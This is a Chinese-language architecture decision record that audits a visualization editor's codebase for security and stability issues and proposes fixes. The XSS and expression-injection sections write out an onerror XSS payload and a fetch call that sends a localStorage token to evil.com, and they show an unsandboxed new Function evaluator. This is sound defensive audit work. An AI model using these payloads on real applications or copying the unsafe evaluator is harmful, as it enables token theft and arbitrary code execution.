# ADR-002: 关键安全与稳定性问题补充分析

## 状态
- **状态**: 草案 (Draft)
- **日期**: 2026-02-28
- **作者**: Kimi Code
- **分类**: 安全 / 稳定性

## 执行摘要

本 ADR 补充 ADR-001 遗漏的**最严重、最潜在、最易被疏忽**的问题。这些问题如果不解决，可能导致：
- 安全漏洞被利用
- 生产环境灾难性故障
- 难以调试的诡异 Bug

## 🔴 P0: 立即修复（本周内）

### 1. XSS 漏洞 - innerHTML 注入风险

**位置**: 
- `packages/thingsvis-ui/src/engine/VisualEngine.ts:730`
- `widgets/basic/text/src/index.ts` (富文本模式)

**代码证据**:
```typescript
// VisualEngine.ts:730
overlayBox.innerHTML = `
  <div style="...">${errMsg}</div>  <!-- errMsg 可能包含用户输入 -->
`;
```

**攻击场景**:
1. 攻击者创建一个 Widget，将 `props.title` 设为 `<img src=x onerror=alert('xss')>`
2. Widget 渲染失败，触发 errorRenderer
3. errMsg 包含恶意 payload，被 innerHTML 执行
4. 攻击者可以：窃取 localStorage 中的 token、发起恶意请求

**修复方案**:
```typescript
// 使用 DOMPurify 或转义
import DOMPurify from 'dompurify';

overlayBox.innerHTML = `
  <div style="...">${DOMPurify.sanitize(errMsg)}</div>
`;

// 或者使用 textContent
const div = document.createElement('div');
div.textContent = errMsg;  // 自动转义
overlayBox.appendChild(div);
```

---

### 2. 表达式求值无沙箱 - 任意代码执行

**位置**: `packages/thingsvis-ui/src/engine/VisualEngine.ts:1016`

**代码证据**:
```typescript
// PropertyResolver.ts 或类似位置
resolveExpression(expr: string, context: object): unknown {
  // 危险！直接使用 eval 或 new Function
  const fn = new Function('context', `with(context) { return ${expr}; }`);
  return fn(context);
}
```

**攻击场景**:
1. 攻击者在数据绑定表达式中输入: `fetch('https://evil.com?token='+localStorage.token)`
2. 表达式被求值，token 被发送到攻击者服务器
3. 或者执行 `document.location='https://evil.com'` 跳转

**修复方案**:
```typescript
// 方案 A: 使用安全表达式库
import { compileExpression } from 'filtrex';

const compiled = compileExpression(expr, {
  extraFunctions: {},  // 白名单函数
  customProp: (path) => context[path]  // 受控属性访问
});
return compiled();

// 方案 B: JSONPath 只读访问
import JSONPath from 'jsonpath-plus';
return JSONPath({ path: expr, json: context });
```

---

### 3. React 版本不一致 - 运行时崩溃风险

**位置**: 
- `apps/server/package.json`: `"react": "^19.0.0"`
- `apps/studio/package.json`: `"react": "^18.2.0"`

**风险**:
- React 18 和 19 的 Hook 实现不同
- Module Federation 共享 singleton 时可能加载错误版本
- 导致 Hooks 状态错乱、组件渲染异常

**修复方案**:
```json
// root package.json
{
  "pnpm": {
    "overrides": {
      "react": "^18.2.0",
      "react-dom": "^18.2.0",
      "@types/react": "^18.2.0",
      "@types/react-dom": "^18.2.0"
    }
  }
}
```

---

### 4. 全局缓存无过期 - 内存泄漏

**位置**: `packages/thingsvis-kernel/src/loader/UniversalLoader.ts`

**代码证据**:
```typescript
private moduleCache = new Map<RemoteCacheKey, Promise<unknown>>();
private remoteEntryFetchPromises = new Map<string, Promise<string>>();
// 无清理逻辑！
```

**后果**:
- 编辑器运行数小时后，内存持续增长
- 最终浏览器标签页崩溃
- 用户丢失未保存的工作

**修复方案**:
```typescript
import { LRUCache } from 'lru-cache';

private moduleCache = new LRUCache<RemoteCacheKey, Promise<unknown>>({
  max: 100,           // 最多缓存 100 个组件
  ttl: 1000 * 60 * 60, // 1 小时过期
  updateAgeOnGet: true,
  dispose: (value, key) => {
    // 清理资源
  }
});
```

---

## 🟡 P1: 高优先级（本月内）

### 5. Module Federation 加载无超时/重试

**位置**: `UniversalLoader.ts:163-191`

**问题**:
```typescript
async loadComponent<T = unknown>(scope: string, module: string): Promise<T> {
  // ...
  const remoteModule = (await loadRemote(id)) as T;  // 可能永远挂起
  return remoteModule;
}
```

**后果**:
- 网络不稳定时 Widget 加载卡住
- 用户看到无限 loading，无法操作

**修复方案**:
```typescript
async loadComponent<T = unknown>(
  scope: string, 
  module: string,
  options: { timeout?: number; retries?: number } = {}
): Promise<T> {
  const { timeout = 10000, retries = 3 } = options;
  
  const attempt = async (retryCount: number): Promise<T> => {
    try {
      return await Promise.race([
        this.doLoad(scope, module),
        new Promise<never>((_, reject) => 
          setTimeout(() => reject(new Error('Load timeout')), timeout)
        )
      ]);
    } catch (err) {
      if (retryCount > 0) {
        await delay(1000 * (retries - retryCount + 1)); // 指数退避
        return attempt(retryCount - 1);
      }
      throw err;
    }
  };
  
  return attempt(retries);
}
```

---

### 6. 细粒度订阅缺失 - 性能灾难

**位置**: `apps/studio/src/components/CanvasView.tsx:58-62`

**问题**:
```typescript
const kernelState = useSyncExternalStore(
  useCallback((subscribe) => store.subscribe(subscribe), [store]),
  () => store.getState() as KernelState,  // 订阅整个状态树！
  () => store.getState() as KernelState
);
```

**后果**:
- 1000 个节点，移动其中一个 → 全量重渲染
- 动画卡顿，用户体验极差

**修复方案**:
```typescript
// 使用 selector
const selectedNodes = useSyncExternalStore(
  (subscribe) => store.subscribe(subscribe),
  () => store.getState().selection.selectedIds,
  () => store.getState().selection.selectedIds
);

// 或使用 Zustand 的 selector API
const nodesById = useNodeStore((state) => state.nodesById);
```

---

### 7. IndexedDB 缓存无 TTL

**位置**: `packages/thingsvis-kernel/src/loader/RemoteEntryCache.ts`

**问题**: 
```typescript
// 写入后永不过期
await set(cacheKey(url), { url, sourceText, timestamp: Date.now() }, store);
// 无清理逻辑
```

**后果**:
- Widget 更新后用户仍加载旧版本
- 难以调试的缓存问题
- 存储配额耗尽

**修复方案**:
```typescript
// 读取时检查 TTL
export async function getCachedRemoteEntry(
  url: string, 
  maxAge: number = 24 * 60 * 60 * 1000 // 24小时
): Promise<CachedRemoteEntry | undefined> {
  try {
    const cached = await get(cacheKey(url), store);
    if (cached && Date.now() - cached.timestamp < maxAge) {
      return cached;
    }
    // 过期删除
    await del(cacheKey(url), store);
    return undefined;
  } catch {
    return undefined;
  }
}
```

---

## 🟢 P2: 中优先级（下月内）

### 8. ResizeObserver 竞态条件

**位置**: `VisualEngine.ts:363`

**问题**:
```typescript
// 组件已卸载但 ResizeObserver 回调仍触发
resizeObserver.observe(element);
// destroy 中未 disconnect
```

**修复**: 确保 destroy 中调用 `resizeObserver.disconnect()`

### 9. 空 catch 块 - 错误静默

**位置**: 多处

**问题**:
```typescript
try {
  // ...
} catch {
  // 空处理，错误被吞掉
}
```

**修复**: 至少记录到错误监控系统

### 10. JSON.stringify 性能热点

**位置**: `VisualEngine.ts:428`

**问题**: 大数据量时 JSON.stringify 阻塞主线程

**修复**: 使用 Web Worker 或分片处理

---

## 快速修复清单

### 本周必须完成
- [ ] 1. 统一 React 版本到 18.2.0
- [ ] 2. 所有 innerHTML 替换为 textContent 或 DOMPurify
- [ ] 3. 表达式求值添加沙箱或替换为安全库
- [ ] 4. UniversalLoader 添加 LRU 缓存

### 本月完成
- [ ] 5. MF 加载添加超时和重试
- [ ] 6. KernelStore 实现细粒度订阅
- [ ] 7. IndexedDB 缓存添加 TTL

### 下月完成
- [ ] 8-10. 其他稳定性改进

---

## 验证方式

| 检查项 | 验证方法 |
|--------|---------|
| XSS 修复 | 输入 `<img src=x onerror=alert(1)>` 验证是否执行 |
| 表达式沙箱 | 输入 `fetch('evil')` 验证是否报错而非执行 |
| React 版本 | `npm ls react` 确认全项目一致 |
| 缓存 TTL | 设置 1 秒 TTL，验证过期后重新加载 |
| MF 超时 | 断网测试，验证 10 秒内超时失败 |
